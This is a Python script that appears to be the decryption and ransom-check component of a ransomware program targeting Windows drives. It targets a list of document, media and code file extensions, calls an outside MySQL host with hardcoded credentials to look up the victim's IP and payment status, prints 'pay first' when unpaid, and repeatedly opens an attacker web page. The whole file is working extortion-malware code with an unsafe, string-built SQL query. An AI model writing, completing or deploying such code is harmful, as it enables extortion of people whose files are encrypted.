from Crypto.Cipher import AES
import os, random
from Crypto.Hash import SHA256
from fnmatch import fnmatch
from threading import Thread
import time
from threading import Timer
import sys
from tkinter import *
import webbrowser
#from encrypt1 import *
import win32api
import mysql.connector
import socket

url='http://menace4you.weebly.com'
directory='C:/'
password="hello123"
location = " "
count=0
root = directory

#THIS WILL TARGET ALL THE FILES THAT END WITH THE FOLLOWING EXTENSIONS
pattern = ["*.txt",
            "*.docx",
            "*.jpg",
            "*.jpeg",
            "*.pdf",
            "*.exe",
            "*.mp3",
            "*.mp4",
            "*.avi",
            "*.wmv",
            "*.mov",
            "*.csv",
            "*.xlsx",
            "*.pptx",
            "*.py",
            "*.png",
            "*.bmp",
            "*.cpp",
            "*.java",
            "*.jar",
           "*.xml"]


def delcall():
    #remove(argv[0])
    pass

def drives():
    str1 = []
    str = []
    drives = win32api.GetLogicalDriveStrings()
    drives = drives.split('\000')[:-1]
    for x in drives:
        str1 += [x]
        y = x[:1]
        #print(y)
        z=y+":/"
        str+=[z]
    return str


def decrypt(key, filename):
    chunksize = 64 * 1024
    outfile = filename[9:]
    with open(filename, 'rb') as infile:
        filesize = infile.read(16)
        IV = infile.read(16)
        decryptor = AES.new(key, AES.MODE_CBC, IV)
        with open(outfile, 'wb') as outfile:
            while True:
                chunk = infile.read(chunksize)
                if len(chunk) == 0:
                    break
                outfile.write(decryptor.decrypt(chunk))
                outfile.truncate(int(filesize))
            infile.close()
            outfile.close()
            os.remove(filename)



def getkey(password):
    a = password.encode('utf-8')
    hasher = SHA256.new(a)
    return hasher.digest()


def initial():
    password = 'hello123'
    url='http://menace4you.weebly.com'


def dcall(password,str):
    a = []
    #ecall.root=str(input("Enter decryption location"))
    print("YOYR FILES ARE BEING UNLOCKED ")
    pattern = "encrypted*"
    root=str
    for path, subdirs, files in os.walk(root):
        for name in files:
            if fnmatch(name, pattern):
                print(name)
                a += [os.path.join(path, name)]

    s = len(a)
    for i in range(0, s):
        m, n = os.path.split(a[i])
        os.chdir(m)
        try:
            decrypt(getkey(password), n)

        except:
            pass

    print("\n\nYOUR FILES HAVE BEEN UNLOCKED")
    os._exit(0)


def gui(count):
    time.sleep(5.0)
    w=""
    abc=1
    if count<=5:
        webbrowser.open_new(url)
        count+=1
        abc=count
        if (w == "00"):
            dcall()
            sys.exit()
        else:
            gui(abc)
    else:
        pass

def timer():
    for x in range(30,0):
        time.sleep(1)
        print(x)

def info():
    a = socket.gethostname()
    hostname = socket.gethostname()
    IP = socket.gethostbyname(hostname)
    print(IP)
    print(a)
    return str(IP)

def retrieve():
    db = mysql.connector.connect(user="b08a6132c3ba56", password="344292f1", host="au-cdbr-sl-syd-01.cleardb.net",
                                 database="ibmx_8cdd8c9126b89e9")
    cursor = db.cursor()
    ip1 = info()

    uuid1 = ""
    sql = "SELECT * FROM CERTDB WHERE IP='" + ip1 + "' ORDER BY TIME "
    print(sql)
    try:
        # Execute the SQL command
        cursor.execute(sql)
        # Fetch all the rows in a list of lists.
        results = cursor.fetchall()
        for row in results:
            name = row[0]
            ip = row[1]
            uuid = row[2]
            time = row[3]
            stat=row[4]
            print(row[0], row[1], row[2], row[3], row[4])

            if ip1 == ip:
                uuid1 = uuid
                print(uuid1)


    except:
        print("Error: unable to fecth data")

        # disconnect from server

    db.close
    return str(uuid1), str(stat)

def connect():
    try:
        REMOTE_SERVER = "www.google.com"
        host=socket.gethostbyname(REMOTE_SERVER)
        s=socket.create_connection((host,80),2)
        return True
    except:
        pass
    return False


def main2():
    #y=30
    initial()
    a = connect()
    if a is True:
        pass
        #print("true")
    else:
        pass
        sys.exit()
    #ecall()
    #delcall()
    try:
        pass1, stat = retrieve()
    except:
        pass
        #sys.exit()

    if stat == "yes":
        print("password = ",pass1)
    else:
        print("pay first")
        sys.exit()

    xy = input("Enter The Decryption Password : ")
    if xy == pass1:
        abc = drives()
        for u in abc:
            try:
                print("\n\n", u, "\n\n")
                dcall(pass1,u)
            except FileNotFoundError:
                print("lol bro")
    else:
        print("Password you entered is invalid")
        main2()

    #Thread(target=ecall).start()
    #Thread(target=gui(1)).start()
    #Thread(target=timer()).start()
    #sys.exit()



main2()